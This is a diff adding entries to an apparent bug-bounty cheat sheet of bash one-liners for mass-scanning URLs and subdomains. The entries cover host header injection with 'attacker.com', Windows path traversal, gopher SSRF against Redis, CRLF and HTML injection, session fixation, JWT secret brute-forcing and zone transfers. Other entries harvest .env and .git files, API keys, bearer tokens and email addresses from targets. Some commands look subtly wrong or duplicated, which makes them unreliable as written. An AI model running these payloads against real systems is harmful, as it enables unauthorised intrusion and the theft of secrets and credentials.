@@ -1008,3 +1008,108 @@ cat all_urls.txt | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr '
 ```bash
 cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' -o leaked_emails.txt
 ```
+
+### Host Header Injection
+```bash
+cat all_urls.txt | httpx -silent -H 'Host: attacker.com' -fr 'attacker.com' -o host_header_injection.txt
+```
+
+### Path Traversal (Windows)
+```bash
+cat all_urls.txt | qsreplace 'C:/Windows/win.ini' | httpx -silent -fr 'for 16-bit app support' -o windows_traversal.txt
+```
+
+### Sensitive Files (Backup Files Exposure)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\n/config.php.bak\n/database.yml\n/backup.zip') -mc 200 -o sensitive_files.txt
+```
+
+### Exposed Config Panels (CMS, Jenkins, PhpMyAdmin)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin\n/jenkins\n/wp-admin\n/admin\n/cpanel') -mc 200 -o exposed_panels.txt
+```
+
+### Hardcoded API Keys in JS Files
+```bash
+cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'apiKey|apikey|secret|token|bearer' | tee hardcoded_api_keys.txt
+```
+
+### Spring Boot Actuator Exposed Endpoints
+```bash
+cat subdomains.txt | httpx -silent -path '/actuator/health' -mc 200 -o exposed_actuators.txt
+```
+
+### Gopher SSRF (Redis/SMTP Attack)
+```bash
+cat all_urls.txt | qsreplace 'gopher://127.0.0.1:6379/_COMMAND' | httpx -silent -o gopher_ssrf_candidates.txt
+```
+
+### HTML Injection (Reflected)
+```bash
+cat all_urls.txt | gf xss | qsreplace '<h1>PWNED</h1>' | httpx -silent -fr '<h1>PWNED</h1>' -o html_injection.txt
+```
+
+### API Token Misconfiguration (Bearer Token Disclosure)
+```bash
+cat all_urls.txt | httpx -silent -hdrs | grep -i 'authorization: Bearer' | tee bearer_tokens.txt
+```
+
+### WordPress Plugin Vulnerabilities (Outdated Plugins)
+```bash
+nuclei -l subdomains.txt -t cves/wordpress/ -o wp_vulns.txt
+```
+
+### Broken Link Hijacking (Subdomain Takeover via Broken Links)
+```bash
+cat subdomains.txt | gau | grep -E '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf|ico)' | httpx -silent -status-code -o broken_links.txt
+```
+
+### CRLF Injection (HTTP Response Splitting)
+```bash
+cat all_urls.txt | qsreplace '%0d%0aSet-Cookie:crlftest=crlfpoc' | httpx -silent -fr 'crlftest=crlfpoc' -o crlf_injection.txt
+```
+
+### Cloud Storage Misconfig (AWS S3 Bucket Public Access)
+```bash
+cat subdomains.txt | nuclei -t misconfiguration/ -o s3_buckets.txt
+```
+
+### HTTP Method Fuzzing (Check PUT/DELETE enabled)
+```bash
+cat subdomains.txt | httpx -silent -methods PUT,DELETE -mc 200 -o risky_methods.txt
+```
+
+### GraphQL Misconfig (Introspection Enabled)
+```bash
+cat subdomains.txt | httpx -silent -path '/graphql' -mc 200 -fr 'Introspection Query' -o graphql_introspection.txt
+```
+
+### DNS Zone Transfer (AXFR Check)
+```bash
+for domain in $(cat subdomains.txt); do dig axfr $domain @ns1.$domain; done
+```
+
+### CSP Bypass/Weak CSP Check
+```bash
+cat subdomains.txt | nuclei -t security-misconfiguration/csp-missing.yaml -o weak_csp.txt
+```
+
+### Backup Files (Git, SQL Dumps, Zip Archives)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.sql\n/.git/config\n/backup.zip') -mc 200 -o backup_leaks.txt
+```
+
+### Session Fixation (Check if sessionID can be set)
+```bash
+cat all_urls.txt | qsreplace 'sessionid=abc123' | httpx -silent -fr 'sessionid=abc123' -o session_fixation.txt
+```
+
+### JWT Secret Bruteforce (Weak Signing Keys)
+```bash
+cat subdomains.txt | jwt_tool -I -bruteforce wordlist.txt -o weak_jwt_keys.txt
+```
+
+### Exposed Email Addresses in Webpages
+```bash
+cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' -o leaked_emails.txt
+```
